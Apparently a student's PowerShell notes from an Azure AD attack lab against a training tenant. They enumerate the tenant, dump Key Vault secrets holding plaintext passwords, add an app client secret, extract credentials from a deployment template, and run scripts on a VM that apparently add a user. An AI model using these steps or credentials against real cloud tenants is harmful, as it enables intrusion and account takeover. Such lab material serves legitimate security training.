# Module A
$AADInternalModulePath = "C:\AzAD\Tools\AADInternals\AADInternals.psd1"
Import-Module $AADInternalModulePath

$Domain = "defcorphq.onmicrosoft.com"

$TenantId = (Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com)

Carp-ConnectWithCreds -Username "test@defcorphq.onmicrosoft.com" -Password "..."

Carp-BasicMgEnum
Carp-AzEnum

#hellonewapp
#appid 725e9fcf-0c56-43f0-953b-a8247bf8abe0
#secretid 4e6c0cbe-42fa-4b6d-9176-1d0b078fb959
#secret value 
#victim markdwalden@defcorphq.onmicrosoft.com
#defcorphqcareer.azurewebsites.net

#secret2 
#appid f7746c24-b35c-4334-803c-07d868b84d5d

Connect-AzAccount -AccountId $accountid -AccessToken $accessToken -GraphAccessToken $graphtoken -KeyVaultAccessToken $keyvaulttoken
Key Vault: ResearchKeyVault
====================================
Secret Name: Reader
Secret Version:
Secret Value: username: kathynschaefer@defcorphq.onmicrosoft.com ; password: Hav3Y0uLooked@KeyVault!!K4thY


Client secret added to :

Object ID : 35589758-714e-43a9-be9e-94d22fdd34f6
App ID    : f072c4a6-b440-40de-983f-a7f3bd317d8f
App Name  : fileapp
Key ID    : 8e61bad2-d339-4215-94dd-3b13e064ccfd
Secret    : 

Carp-ConnectAsServicePrincipal -AppId 'f072c4a6-b440-40de-983f-a7f3bd317d8f' -Password '...' -GraphToken $GraphToken


Key Vault: credvault-fileapp
====================================
Secret Name: MobileUsersBackup
Secret Version:
Secret Value: username: DavidDHenriques@defcorphq.onmicrosoft.com ; password: Dav!dUsedM0b1le@t0rganization
-----------------------------

Template saved at: C:\windows\Temp\deployments\DavidDHenriques_defcorphq.onmicrosoft.com.stagingenv.json
CommandToExecute found in resource: [parameters('vmName')]
Command: $username = "thomasebarlow@defcorpit.onmicrosoft.com";$password="Th0masH@sDeployM3ntRights!!";$SecurePassword = ConvertTo-SecureString "$password" -AsPlainText -Force;$credentials = New-Object System.Management.Automation.PSCredential($username, $SecurePassword);Login-AzAccount -Credential $credentials;Get-AzureADTenantDetail
------------------------------------

Carp-CreateAndRunRunbook -RunbookName myrunbookpro1 -RunbookPath 'C:\AzAD\Tools\studentx.ps1' -RunOn Workergroup1

Carp-RunCommandOnVm -VmName bkpadconnect -ResourceGroupName Engineering -ScriptPath 'C:\AzAD\Tools\adduser.ps1'

Carp-VmConnect -VmName bkpadconnect -ResourceGroupName Engineering -Username Huyhekhellostudent13 -Password '...'